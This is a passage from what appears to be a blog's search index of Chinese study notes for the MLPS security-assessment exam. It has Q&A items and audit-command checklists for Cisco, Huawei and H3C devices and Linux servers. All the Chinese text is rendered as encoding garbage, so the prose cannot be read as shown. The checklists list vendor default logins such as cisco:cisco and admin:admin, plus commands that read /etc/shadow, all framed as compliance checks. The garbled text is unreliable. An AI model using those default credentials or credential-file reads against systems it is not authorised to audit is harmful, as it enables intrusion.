‡è®°çš„ä¿¡æ¯èµ„æºçš„è®¿é—®ã€‚\n\n\nQ:äºŒçº§ä¸­ï¼Œåº”æ ¹æ®ä¼šè¯çŠ¶æ€ä¿¡æ¯æ•°ä¸ºæ•°æ®æµæä¾›æ˜ç¡®çš„å…è®¸æˆ–æ‹’ç»è®¿é—®èƒ½åŠ›ï¼Œæ§åˆ¶ç²’åº¦ä¸ºç½‘æ®µçº§ï¼ŸA:æ­£ç¡®  \n\nã€ŠåŸºæœ¬è¦æ±‚ã€‹/å®‰å…¨åŒºåŸŸè¾¹ç•Œ/è®¿é—®æ§åˆ¶ï¼šä¸‰çº§åº”å¯¹è¿›å‡ºç½‘ç»œçš„æ•°æ®æµå®ç°åŸºäºåº”ç”¨åè®®å’Œåº”ç”¨å†…å®¹çš„è®¿é—®æ§åˆ¶ã€‚\nä¸‰çº§ä¸ºç«¯å£çº§ï¼ŒäºŒçº§ä¸ºç½‘æ®µçº§ã€‚  \n\n\n\nQ:åº”ç”¨å±‚è½¯ä»¶è½¯ä»¶çš„å®¹é”™ï¼Œä¸‰çº§æ¯”äºŒçº§å¤šäº†ä»€ä¹ˆè¦æ±‚ï¼ŸA:åº”æä¾›è‡ªåŠ¨ä¿æŠ¤åŠŸèƒ½ï¼Œå½“æ•…éšœå‘ç”Ÿæ—¶è‡ªåŠ¨ä¿æŠ¤å½“å‰æ‰€æœ‰çŠ¶æ€ï¼Œä¿è¯ç³»ç»Ÿèƒ½å¤Ÿè¿›è¡Œæ¢å¤ã€‚  \n\nã€ŠåŸºæœ¬è¦æ±‚ã€‹/å®‰å…¨è®¡ç®—ç¯å¢ƒ/æ•°æ®å¤‡ä»½ä¸æ¢å¤(ä¸‰çº§ä¸äºŒçº§çš„å·®å¼‚)ï¼šåº”æä¾›å¼‚åœ°å®æ—¶å¤‡ä»½åŠŸèƒ½ï¼Œåˆ©ç”¨é€šä¿¡ç½‘ç»œå°†é‡è¦æ•°æ®å®æ—¶å¤‡ä»½è‡³å¤‡ä»½åœºåœ°ã€‚åº”æä¾›é‡è¦æ•°æ®å¤„ç†ç³»ç»Ÿçš„çƒ­å†—ä½™ï¼Œä¿è¯ç³»ç»Ÿçš„é«˜å¯ç”¨æ€§ã€‚\n\n\nç­‰ä¿2.0ä¸1.0çš„å·®å¼‚\nQ:ç­‰ä¿1.0å’Œç­‰ä¿2.0çš„åŒºåˆ«ï¼ŸA:    \n\n\n\nç­‰ä¿\n2.0\n1.0\n\n\n\n\nåç§°\nã€Šä¿¡æ¯å®‰å…¨æŠ€æœ¯ç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤åŸºæœ¬è¦æ±‚ã€‹\nã€Šä¿¡æ¯å®‰å…¨æŠ€æœ¯ç³»ç»Ÿå®‰å…¨ç­‰çº§ä¿æŠ¤åŸºæœ¬è¦æ±‚ã€‹\n\n\nå®šçº§å¯¹è±¡\nä¿¡æ¯ç³»ç»Ÿã€åŸºç¡€ä¿¡æ¯ç½‘ç»œã€äº‘è®¡ç®—å¹³å°ã€å¤§æ•°æ®å¹³å°ã€ç‰©è”ç½‘ç³»ç»Ÿã€å·¥ä¸šæ§åˆ¶ç³»ç»Ÿã€é‡‡ç”¨ç§»åŠ¨äº’è”æŠ€æœ¯çš„ç½‘ç»œç­‰\nä¿¡æ¯ç³»ç»Ÿ\n\n\nå®‰å…¨è¦æ±‚\nå®‰å…¨é€šç”¨è¦æ±‚ä¸å®‰å…¨æ‰©å±•è¦æ±‚\nå®‰å…¨è¦æ±‚\n\n\næªæ–½åˆ†ç±»ç»“æ„å˜åŒ–\næŠ€æœ¯ï¼š å®‰å…¨ç‰©ç†ç¯å¢ƒã€å®‰å…¨é€šä¿¡ç½‘ç»œã€å®‰å…¨åŒºåŸŸè¾¹ç•Œã€å®‰å…¨è®¡ç®—ç¯å¢ƒã€å®‰å…¨ç®¡ç†ä¸­å¿ƒ ç®¡ç†ï¼š å®‰å…¨ç®¡ç†åˆ¶åº¦ã€å®‰å…¨ç®¡ç†æœºæ„ã€å®‰å…¨ç®¡ç†äººå‘˜ã€å®‰å…¨å»ºè®¾ç®¡ç†ã€å®‰å…¨è¿ç»´ç®¡ç†\næŠ€æœ¯ï¼š ç‰©ç†å®‰å…¨ã€ç½‘ç»œå®‰å…¨ã€ä¸»æœºå®‰å…¨ã€åº”ç”¨å®‰å…¨ã€æ•°æ®å®‰å…¨ ç®¡ç†ï¼š å®‰å…¨ç®¡ç†åˆ¶åº¦ã€å®‰å…¨ç®¡ç†æœºæ„ã€äººå‘˜å®‰å…¨ç®¡ç†ã€ç³»ç»Ÿå»ºè®¾ç®¡ç†ã€ç³»ç»Ÿè¿ç»´ç®¡ç†\n\n\nå†…å®¹å˜åŒ–\nå®šçº§-å¤‡æ¡ˆ-å»ºè®¾æ•´æ”¹-ç­‰çº§æµ‹è¯„-ç›‘ç£æ£€æŸ¥+æ–°çš„å®‰å…¨è¦æ±‚(é£é™©è¯„ä¼°ã€å®‰å…¨ç›‘æµ‹ã€é€šæŠ¥é¢„è­¦ã€æ€åŠ¿æ„ŸçŸ¥ç­‰)\nå®šçº§-å¤‡æ¡ˆ-å»ºè®¾æ•´æ”¹-ç­‰çº§æµ‹è¯„-ç›‘ç£æ£€æŸ¥\n\n\n\n\nå…¶ä»–\nQ:IDSå’ŒIPSçš„åŒºåˆ«ï¼ŸA: IDSçš„å·¥ä½œæ¨¡å¼ä¸ºæ‚åˆæ¨¡å¼ï¼Œä½¿ç”¨SPANæŠ€æœ¯ä¾§æŒ‚åœ¨ä¸»å¹²ä¸Šï¼Œå•ç‹¬å·¥ä½œèƒ½å¤Ÿæ£€æµ‹ä½†æ— æ³•æŠµå¾¡ï¼›IPSçš„å·¥ä½œæ¨¡å¼ä¸ºåœ¨çº¿æ¨¡å¼ï¼Œç›´æ¥éƒ¨ç½²åœ¨ä¸»å¹²ä¸Šï¼Œæ ¹æ®æµé‡ç­–ç•¥ï¼Œå•ç‹¬å·¥ä½œèƒ½å¤Ÿæ£€æµ‹å¹¶æŠµå¾¡å¼‚å¸¸æµé‡ã€‚   \n\n\nQ:HIDSå’ŒNIDSçš„åŒºåˆ«ï¼ŸA: \n\n\n\né¡¹ç›®\nHIDS\nNIDS\n\n\n\n\nç³»ç»Ÿéƒ¨ç½²ä¸ç»´æŠ¤\nä¸ç½‘ç»œæ‹“æ‰‘æ— å…³ï¼ˆç›´æ¥å®‰è£…åœ¨ç³»ç»Ÿä¸»æœºä¸­ï¼‰\nä¸ç½‘ç»œæ‹“æ‰‘ç›¸å…³\n\n\næ£€æµ‹ç‰¹å¾\näº‹ä»¶ä¸ä¿¡å·åˆ†æ\nç‰¹å¾ä»£ç åˆ†æ\n\n\nå®‰å…¨ç­–ç•¥\nåŸºæœ¬å®‰å…¨ç­–ç•¥ï¼ˆç‚¹ç­–ç•¥ï¼‰\nè¿è¡Œå®‰å…¨ç­–ç•¥ï¼ˆçº¿ç­–ç•¥ï¼‰\n\n\nå®‰å…¨å±€é™\nåˆ°è¾¾ä¸»æœºçš„æ‰€æœ‰äº‹ä»¶\nä¼ è¾“ä¸­çš„éåŠ å¯†éä¿å¯†ä¿¡æ¯\n\n\nå®‰å…¨éšæ‚£\nè¿è§„äº‹ä»¶\næ”»å‡»æ–¹æ³•æˆ–æ‰‹æ®µ\n\n\n\n\n","categories":["ç­‰ä¿æµ‹è¯„/åˆçº§è€ƒè¯•"],"tags":[]},{"title":"å‘½ä»¤ç›¸å…³é¢˜ç›®","url":"/8c54db8b.html","content":"ç½‘ç»œè®¾å¤‡è·¯ç”±å™¨/äº¤æ¢æœº1.èº«ä»½é‰´åˆ«\n1.1 åº”å¯¹ç™»å½•çš„ç”¨æˆ·è¿›è¡Œèº«ä»½æ ‡è¯†å’Œé‰´åˆ«ï¼Œèº«ä»½æ ‡è¯†å…·æœ‰å”¯ä¸€æ€§ï¼Œèº«ä»½é‰´åˆ«ä¿¡æ¯å…·æœ‰å¤æ‚åº¦è¦æ±‚å¹¶å®šæœŸæ›´æ¢ã€‚    \n\n\n\nè®¾å¤‡/å‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nCisco/show run\nèº«ä»½è®¤è¯ã€ç”¨æˆ·å£ä»¤é…ç½®\nå­˜åœ¨â€username x privilege x password xâ€¦â€\n\n\nCisco/show run\nèº«ä»½è®¤è¯é…ç½®\nå¯ç”¨AAAæœåŠ¡å™¨â€aaa authentication login/enableâ€¦â€\n\n\nåä¸ºã€H3C/display current-configuration\nèº«ä»½è®¤è¯ã€ç”¨æˆ·å£ä»¤é…ç½®\nå­˜åœ¨â€local-user x password irreversible-cipherâ€¦â€\n\n\nH3C/display password-control\nç”¨æˆ·å£ä»¤é…ç½®\nå­˜åœ¨â€password-control aging/length/historyâ€¦â€\n\n\nCisco/enable secret æˆ– enable password\nç‰¹æƒç”¨æˆ·è®¾ç½®å£ä»¤\n\n\n\n1.2 åº”å…·æœ‰ç™»é™†å¤±è´¥å¤„ç†åŠŸèƒ½ï¼Œåº”é…ç½®å¹¶å¯ç”¨ç»“æŸä¼šè¯ã€é™åˆ¶éæ³•ç™»å½•æ¬¡æ•°å’Œå½“ç™»å½•è¿æ¥è¶…æ—¶è‡ªåŠ¨é€€å‡ºç­‰ç›¸å…³æªæ–½ã€‚  \n\n\n\nè®¾å¤‡/å‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nH3C/display password-control\nç™»é™†ä¸€å®šæ¬¡æ•°åè¿›è¡Œè´¦æˆ·é”å®š\nå­˜åœ¨â€password-control login-attempt x exceed locktime xâ€\n\n\nCisco/åä¸º\nè¿ç»­ç™»å½•5æ¬¡å³é”å®š10åˆ†é’Ÿ\n\n\n\nCisco/show run\nè¶…æ—¶æ–­è¿\nâ€œexec-timeout xâ€\n\n\nåä¸º/display current-configuration\nè¶…æ—¶æ–­è¿\nâ€œidle-timeout xâ€\n\n\n\n1.3 å½“è¿›è¡Œè¿œç¨‹ç®¡ç†æ—¶ï¼Œåº”é‡‡å–å¿…è¦æªæ–½é˜²æ­¢é‰´åˆ«ä¿¡æ¯åœ¨ç½‘ç»œä¼ è¾“è¿‡ç¨‹ä¸­è¢«çªƒå¬ã€‚  \n\n\n\nè®¾å¤‡/å‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nCisco/show run\nä½¿ç”¨SSH\nâ€œip ssh time-out x;ip ssh authentication-retries x;transport input sshâ€¦â€\n\n\nåä¸ºã€H3C/display current-configuration\n\nâ€œservice-type ssh level x;ssh user x authentication-type x;protocal inbound sshâ€¦â€\n\n\n\n1.4 åº”é‡‡ç”¨åŒå› å­è®¤è¯ã€‚    \n\n2.è®¿é—®æ§åˆ¶\n2.1 åº”å¯¹ç™»å½•çš„ç”¨æˆ·åˆ†é…è´¦æˆ·çš„æƒé™ã€‚  \n2.2 åº”é‡å‘½åæˆ–åˆ é™¤é»˜è®¤è´¦æˆ·ï¼Œä¿®æ”¹é»˜è®¤è´¦æˆ·çš„é»˜è®¤å£ä»¤ã€‚  \n\n\n\nè®¾å¤‡\né»˜è®¤è´¦æˆ·ï¼šå£ä»¤\né¢„æœŸ\n\n\n\n\nCisco\nciscoï¼šcisco\né»˜è®¤è´¦æˆ·è¢«åˆ é™¤æˆ–é‡å‘½åï¼Œé»˜è®¤å£ä»¤è¢«ä¿®æ”¹\n\n\nCisco\nCiscoï¼šcisco\n\n\n\nåä¸º\nadminï¼šadmin\n\n\n\nåä¸º\nhuaweiï¼šadmin@huawei.com\n\n\n\n2.3 åº”åŠæ—¶åˆ é™¤æˆ–åœç”¨å¤šä½™çš„ã€è¿‡æœŸçš„è´¦æˆ·ï¼Œé¿å…å…±äº«è´¦æˆ·çš„å­˜åœ¨ã€‚  \n\n\n\nè®¾å¤‡/å‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nCisco/show run\nèº«ä»½è®¤è¯é…ç½®\nâ€œusername x privilege x password xâ€¦â€éƒ½æ˜¯å¿…è¦çš„\n\n\nåä¸ºã€H3C/display current-configuration\n\nâ€œlocal-user x privilege level xâ€¦â€éƒ½æ˜¯å¿…è¦çš„\n\n\n\n2.4 ç®¡ç†ç”¨æˆ·æƒé™åˆ†ç¦»&amp;æœ€å°æƒé™åŸåˆ™ã€‚  \n\n\n\nè®¾å¤‡/å‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nCisco/show run\nèº«ä»½è®¤è¯é…ç½®\nâ€œusername x privilege x password xâ€¦â€å„ç”¨æˆ·æƒé™åˆ†ç¦»ä¸”æœ€å°\n\n\nåä¸º/H3Cï¼šdisplay current-configuration\n\nâ€œlocal-user x privilege level xâ€¦â€å„ç”¨æˆ·æƒé™åˆ†ç¦»ä¸”æœ€å°\n\n\n\nã€ä¸é€‚ç”¨ã€‘2.5 åº”ç”±æˆæƒä¸»ä½“é…ç½®è®¿é—®æ§åˆ¶ç­–ç•¥ï¼Œè®¿é—®æ§åˆ¶ç­–ç•¥è§„å®šä¸»ä½“å¯¹å®¢ä½“çš„è®¿é—®è§„åˆ™ã€‚ã€ä¸é€‚ç”¨ã€‘2.6 è®¿é—®æ§åˆ¶çš„ç²’åº¦è¾¾åˆ°ä¸»ä½“ä¸ºç”¨æˆ·çº§æˆ–è¿›ç¨‹çº§ï¼Œå®¢ä½“ä¸ºæ–‡ä»¶ã€æ•°æ®åº“è¡¨çº§ã€‚ã€ä¸é€‚ç”¨ã€‘2.7 åº”å¯¹é‡è¦ä¸»ä½“å’Œå®¢ä½“è®¾ç½®å®‰å…¨æ ‡è®°ï¼Œå¹¶æ§åˆ¶ä¸»ä½“å¯¹æœ‰å®‰å…¨æ ‡è®°ä¿¡æ¯èµ„æºçš„è®¿é—®ã€‚    \n\n3.å®‰å…¨å®¡è®¡\n3.1 åº”å¯ç”¨å®‰å…¨å®¡è®¡åŠŸèƒ½ï¼Œå®¡è®¡è¦†ç›–åˆ°æ¯ä¸ªç”¨æˆ·ï¼Œå¯¹é‡è¦çš„ç”¨æˆ·è¡Œä¸ºå’Œé‡è¦å®‰å…¨äº‹ä»¶è¿›è¡Œå®¡è®¡ã€‚  \n\n\n\nè®¾å¤‡/å‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nCisco/show run\nå®¡è®¡æ—¥å¿—\nâ€œlogging on;logging trap debugging;loging x.x.x.x;service timestamps log datetimeâ€¦â€\n\n\nåä¸º/H3Cï¼šdisplay current-configuration\n\nInfo-center enable;â€¦Snmp-agentâ€¦â€\n\n\n\n3.2 å®¡è®¡è®°å½•åº”åŒ…æ‹¬äº‹ä»¶çš„æ—¥æœŸå’Œæ—¶é—´ã€ç”¨æˆ·ã€äº‹ä»¶ç±»å‹ã€æ—¶é—´æ˜¯å¦æˆåŠŸåŠå…¶ä»–ä¸å®¡è®¡ç›¸å…³çš„ä¿¡æ¯ã€‚3.3 åº”å¯¹å®¡è®¡è®°å½•è¿›è¡Œä¿æŠ¤ï¼Œå®šæœŸå¤‡ä»½ï¼Œé¿å…å—åˆ°æœªé¢„æœŸçš„åˆ é™¤ã€ä¿®æ”¹æˆ–è¦†ç›–ç­‰ã€‚3.4 åº”å¯¹å®¡è®¡è¿›ç¨‹è¿›è¡Œä¿æŠ¤ï¼Œé˜²æ­¢æœªç»æˆæƒçš„ä¸­æ–­ã€‚    \n\n4.å…¥ä¾µé˜²èŒƒ\nã€ä¸é€‚ç”¨ã€‘4.1 åº”éµå¾ªæœ€å°å®‰è£…çš„åŸåˆ™ï¼Œä»…å®‰è£…éœ€è¦çš„ç»„ä»¶å’Œåº”ç”¨ç¨‹åºã€‚4.2 åº”å…³é—­ä¸éœ€è¦çš„ç³»ç»ŸæœåŠ¡ã€é»˜è®¤å…±äº«å’Œé«˜å±ç«¯å£ã€‚  \n\n\n\nè®¾å¤‡/å‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nCisco/sh running\nå®é™…ç½‘ç»œç¯å¢ƒé…ç½®\nâ€œno service x;no x run;no ip xâ€¦â€\n\n\nåä¸º/H3Cï¼šdisplay current-configuration\n\nâ€œip x shutdownâ€¦â€\n\n\n\n4.3 åº”é€šè¿‡è®¾å®šç»ˆç«¯æ¥å…¥æ–¹å¼æˆ–ç½‘ç»œåœ°å€èŒƒå›´å¯¹é€šè¿‡ç½‘ç»œè¿›è¡Œç®¡ç†çš„ç®¡ç†ç»ˆç«¯è¿›è¡Œé™åˆ¶ã€‚  \n\n\n\nè®¾å¤‡/å‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nCisco/show run\nè®¿é—®æ§åˆ¶åˆ—è¡¨\nâ€œaccess-list x permit/deny x;access-x â€¦â€\n\n\nåä¸º/H3Cï¼šdisplay current-configuration\n\nâ€œacl number xâ€¦â€\n\n\n\nã€ä¸é€‚ç”¨ã€‘4.4 åº”æä¾›æ•°æ®æœ‰æ•ˆæ€§æ£€éªŒåŠŸèƒ½ï¼Œä¿è¯é€šè¿‡äººæœºæ¥å£è¾“å…¥æˆ–é€šè¿‡é€šä¿¡æ¥å£è¾“å…¥çš„å†…å®¹ç¬¦åˆç³»ç»Ÿè®¾å®šè¦æ±‚ã€‚4.5 åº”èƒ½å‘ç°å¯èƒ½å­˜åœ¨çš„å·²çŸ¥æ¼æ´ï¼Œå¹¶åœ¨ç»è¿‡å……åˆ†æµ‹è¯•è¯„ä¼°åï¼ŒåŠæ—¶ä¿®è¡¥æ¼æ´ã€‚ã€ä¸é€‚ç”¨ã€‘4.6 åº”èƒ½å¤Ÿæ£€æµ‹åˆ°å¯¹é‡è¦èŠ‚ç‚¹è¿›è¡Œå…¥ä¾µçš„è¡Œä¸ºï¼Œå¹¶åœ¨å‘ç”Ÿä¸¥é‡å…¥ä¾µäº‹ä»¶æ—¶æä¾›æŠ¥è­¦ã€‚   \n\n5.å¯ä¿¡éªŒè¯\n5.1 å¯åŸºäºå¯ä¿¡æ ¹å¯¹é€šä¿¡è®¾å¤‡çš„ç³»ç»Ÿå¼•å¯¼ç¨‹åºã€ç³»ç»Ÿç¨‹åºã€é‡è¦é…ç½®å‚æ•°å’Œåº”ç”¨ç¨‹åºç­‰è¿›è¡Œå¯ä¿¡éªŒè¯ï¼Œå¹¶åœ¨åº”ç”¨ç¨‹åºçš„å…³é”®æ‰§è¡Œç¯èŠ‚è¿›è¡ŒåŠ¨æ€å¯ä¿¡éªŒè¯ï¼Œåœ¨æ£€æµ‹åˆ°å…¶å¯ä¿¡æ€§å—åˆ°ç ´ååè¿›è¡ŒæŠ¥è­¦ï¼Œå¹¶å°†éªŒè¯ç»“æœå½¢æˆå®¡è®¡è®°å½•é€è‡³å®‰å…¨ç®¡ç†ä¸­å¿ƒã€‚   \n\næœåŠ¡å™¨Linux1.èº«ä»½é‰´åˆ«\n1.1 åº”å¯¹ç™»å½•çš„ç”¨æˆ·è¿›è¡Œèº«ä»½æ ‡è¯†å’Œé‰´åˆ«ï¼Œèº«ä»½æ ‡è¯†å…·æœ‰å”¯ä¸€æ€§ï¼Œèº«ä»½é‰´åˆ«ä¿¡æ¯å…·æœ‰å¤æ‚åº¦è¦æ±‚å¹¶å®šæœŸæ›´æ¢ã€‚    \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\n/etc/passwd\nè®°å½•ç”¨æˆ·å±æ€§ï¼ŒåŒ…æ‹¬ç”¨æˆ·åã€å¯†ç ã€ç”¨æˆ·æ ‡è¯†ã€ç»„æ ‡è¯†ç­‰\næ— ç©ºå£ä»¤ç”¨æˆ·\n\n\n/etc/shadow\npasswdä¸­ä¸å†ç›´æ¥è®°å½•å£ä»¤ï¼Œå°†shadowä½œä¸ºçœŸæ­£çš„å£ä»¤æ–‡ä»¶(éœ€rootæƒé™)\n\n\n\n/etc/login.defs å’Œ /etc/default/useradd\n(é»˜è®¤)ç™»é™†ç¨‹åºçš„é…ç½®æ–‡ä»¶,å¯é…ç½®å¯†ç å‚æ•°\nå­˜åœ¨å¯†ç çš„è®¾ç½®\n\n\n/etc/pam.d/system-auth  (Redhatã€CentOSå’ŒFedora)\nä¼˜å…ˆçº§é«˜äºlogin.defs\n\n\n\n/etc/pam.d/common-passwd  (Debianã€Ubuntuå’ŒLinuxMint)\nä¼˜å…ˆçº§é«˜äºlogin.defs\n\n\n\n1.2 åº”å…·æœ‰ç™»é™†å¤±è´¥å¤„ç†åŠŸèƒ½ï¼Œåº”é…ç½®å¹¶å¯ç”¨ç»“æŸä¼šè¯ã€é™åˆ¶éæ³•ç™»å½•æ¬¡æ•°å’Œå½“ç™»å½•è¿æ¥è¶…æ—¶è‡ªåŠ¨é€€å‡ºç­‰ç›¸å…³æªæ–½ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\n/etc/login.defs\n(é»˜è®¤)ç™»é™†ç¨‹åºçš„é…ç½®æ–‡ä»¶,å¯é…ç½®å¯†ç å‚æ•°\næœ¬åœ°ç™»é™†å¤±è´¥å¤„ç†ï¼š%auth required pam_tally2.so onerr=fail deny=5 unlock_time=300 even_deny_root root_unlock_time=10%;è¿œç¨‹ç™»é™†å¤±è´¥å¤„ç†ï¼š%auth required pam_tally2.so onerr=fail deny=5 unlock_time=300 even_deny_root root_unlock_time=10%\n\n\n/etc/pam.d/system-auth  (Redhatã€CentOSå’ŒFedora)\nä¼˜å…ˆçº§é«˜äºlogin.defs\n\n\n\n/etc/pam.d/common-passwd  (Debianã€Ubuntuå’ŒLinuxMint)\nä¼˜å…ˆçº§é«˜äºlogin.defs\n\n\n\n/etc/profile\né…ç½®äº†è¶…æ—¶é”å®šå‚æ•°\nTIMEOUT=300s\n\n\n\n1.3 å½“è¿›è¡Œè¿œç¨‹ç®¡ç†æ—¶ï¼Œåº”é‡‡å–å¿…è¦æªæ–½é˜²æ­¢é‰´åˆ«ä¿¡æ¯åœ¨ç½‘ç»œä¼ è¾“è¿‡ç¨‹ä¸­è¢«çªƒå¬ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nservice -status-all &#124; grep sshd\næŸ¥çœ‹æ˜¯å¦è¿è¡Œäº†sshdæœåŠ¡\nåº”è¿è¡Œ\n\n\nnetstat -an &#124; grep 22\næŸ¥çœ‹ç›¸å…³ç«¯å£æ˜¯å¦å·²æ‰“å¼€\nåº”æ‰“å¼€\n\n\nservice â€“status-all &#124; grep running\næŸ¥çœ‹æ˜¯å¦ä½¿ç”¨Telnet\nåº”æœªä½¿ç”¨Telnet\n\n\n\n1.4 åº”é‡‡ç”¨åŒå› å­è®¤è¯ã€‚  \n\n2.è®¿é—®æ§åˆ¶\n2.1 åº”å¯¹ç™»å½•çš„ç”¨æˆ·åˆ†é…è´¦æˆ·çš„æƒé™ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nls -a &lt;ç›®å½•åæˆ–æ–‡ä»¶å&gt;\n(r,4)(w,2)(x,1)(-,0)\né…ç½®æ–‡ä»¶â‰¤644ï¼›å¯æ‰§è¡Œæ–‡ä»¶â‰¤755\n\n\n\n2.2 åº”é‡å‘½åæˆ–åˆ é™¤é»˜è®¤è´¦æˆ·ï¼Œä¿®æ”¹é»˜è®¤è´¦æˆ·çš„é»˜è®¤å£ä»¤ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\n/etc/shadow\næŸ¥çœ‹æ˜¯å¦å­˜åœ¨admã€lpã€shutdownã€haltã€mailã€uucpã€gamesã€ftpç­‰é»˜è®¤æ— ç”¨è´¦æˆ·\nåº”ä¸å­˜åœ¨\n\n\n/etc/ssh/sshd_config\nå‚æ•°PermitRootLoginæ˜¯å¦ä¸ºno\nåº”ä¸ºnoï¼Œè¡¨ç¤ºä¸å…è®¸rootè¿œç¨‹ç™»é™†(ssh)\n\n\n(AIX:)/etc/security/user\nå‚æ•°rlogin\nrlogin=Falseï¼Œä¸å…è®¸rootè¿œç¨‹ç™»é™†\n\n\n\n2.3 åº”åŠæ—¶åˆ é™¤æˆ–åœç”¨å¤šä½™çš„ã€è¿‡æœŸçš„è´¦æˆ·ï¼Œé¿å…å…±äº«è´¦æˆ·çš„å­˜åœ¨ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\n/etc/shadow\næŸ¥çœ‹æ˜¯å¦å­˜åœ¨admã€lpã€shutdownã€haltã€mailã€uucpã€gamesã€ftpç­‰é»˜è®¤æ— ç”¨è´¦æˆ·\nåº”ä¸å­˜åœ¨\n\n\n\n2.4 ç®¡ç†ç”¨æˆ·æƒé™åˆ†ç¦»&amp;æœ€å°æƒé™åŸåˆ™ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\n/etc/passwd\næŸ¥çœ‹éé»˜è®¤è´¦æˆ·\nç®¡ç†ç”¨æˆ·æƒé™åˆ†ç¦»ï¼Œæƒé™åº”ç¬¦åˆæœ€å°æƒé™åŸåˆ™\n\n\n/etc/sudoers\næŸ¥çœ‹æœ‰å“ªäº›ç”¨æˆ·èƒ½å¤Ÿä½¿ç”¨sudoå‘½ä»¤æˆäºˆå…¶ä»–ç”¨æˆ·rootæƒé™\nåº”åªæœ‰root\n\n\n\n2.5 åº”ç”±æˆæƒä¸»ä½“é…ç½®è®¿é—®æ§åˆ¶ç­–ç•¥ï¼Œè®¿é—®æ§åˆ¶ç­–ç•¥è§„å®šä¸»ä½“å¯¹å®¢ä½“çš„è®¿é—®è§„åˆ™ã€‚2.6 è®¿é—®æ§åˆ¶çš„ç²’åº¦è¾¾åˆ°ä¸»ä½“ä¸ºç”¨æˆ·çº§æˆ–è¿›ç¨‹çº§ï¼Œå®¢ä½“ä¸ºæ–‡ä»¶ã€æ•°æ®åº“è¡¨çº§ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nls -a &lt;ç›®å½•åæˆ–æ–‡ä»¶å&gt;\n(r,4)(w,2)(x,1)(-,0)\né…ç½®æ–‡ä»¶â‰¤644ï¼›å¯æ‰§è¡Œæ–‡ä»¶â‰¤755\n\n\n\n2.7 åº”å¯¹é‡è¦ä¸»ä½“å’Œå®¢ä½“è®¾ç½®å®‰å…¨æ ‡è®°ï¼Œå¹¶æ§åˆ¶ä¸»ä½“å¯¹æœ‰å®‰å…¨æ ‡è®°ä¿¡æ¯èµ„æºçš„è®¿é—®ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\n/etc/selinux/config\nå‚æ•°SELinux(enforcing/permissive/disabled)\nLinuxé»˜è®¤å…³é—­SELinuxï¼Œæˆ–è€…å·²ä½¿ç”¨ç¬¬ä¸‰æ–¹ä¸»æœºåŠ å›ºç³»ç»Ÿæˆ–å¯¹ç³»ç»Ÿå†…æ ¸è¿›è¡Œäº†äºŒæ¬¡å¼€å‘åŠ å›º(éœ€å®é™…æŸ¥çœ‹ç³»ç»Ÿå¯è§†åŒ–ç•Œé¢)\n\n\n\n\n3.å®‰å…¨å®¡è®¡\n3.1 åº”å¯ç”¨å®‰å…¨å®¡è®¡åŠŸèƒ½ï¼Œå®¡è®¡è¦†ç›–åˆ°æ¯ä¸ªç”¨æˆ·ï¼Œå¯¹é‡è¦çš„ç”¨æˆ·è¡Œä¸ºå’Œé‡è¦å®‰å…¨äº‹ä»¶è¿›è¡Œå®¡è®¡ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nservice syslog status\nç³»ç»Ÿæ—¥å¿—æœåŠ¡\nåº”å¼€å¯\n\n\nservice audit status æˆ– service -status-all &#124; grep audit\næ˜¯å¦å¼€å¯å®¡è®¡è¿›ç¨‹\nåº”å¼€å¯ï¼Œè‹¥æ— åˆ™åº”éƒ¨ç½²äº†ç¬¬ä¸‰æ–¹å®‰å…¨å®¡è®¡å·¥å…·\n\n\nps -ef &#124; grep auditd\næ˜¯å¦å¼€å¯å®‰å…¨å®¡è®¡çš„å®ˆæŠ¤è¿›ç¨‹\nåº”å¼€å¯\n\n\n/etc/audit/audit.rules\næŒ‡å®šå¦‚ä½•å†™å…¥å®¡æŸ¥è®°å½•ä»¥åŠåœ¨å“ªé‡Œå†™å…¥ã€æ—¥å¿—è¶…å‡ºå¯ç”¨ç£ç›˜ç©ºé—´åå¦‚ä½•å¤„ç†ç­‰\nè®°å½•äº†æ–‡ä»¶å’Œåº•å±‚è°ƒç”¨ä¿¡æ¯ï¼Œè®°å½•çš„å®‰å…¨äº‹ä»¶è¾ƒä¸ºå…¨é¢\n\n\n/etc/audit/filesets.conf æˆ– filters.conf\næŒ‡å®šå†…æ ¸ç”¨æ¥åˆ¤å®šç³»ç»Ÿè°ƒç”¨æ˜¯å¦è¦å®¡æŸ¥çš„è§„åˆ™\nåº”å¯ç”¨â€œ@priv-opsâ€â€œ@mount-opsâ€â€œ@system-opsâ€\n\n\n\n3.2 å®¡è®¡è®°å½•åº”åŒ…æ‹¬äº‹ä»¶çš„æ—¥æœŸå’Œæ—¶é—´ã€ç”¨æˆ·ã€äº‹ä»¶ç±»å‹ã€æ—¶é—´æ˜¯å¦æˆåŠŸåŠå…¶ä»–ä¸å®¡è®¡ç›¸å…³çš„ä¿¡æ¯ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nausearch -ts 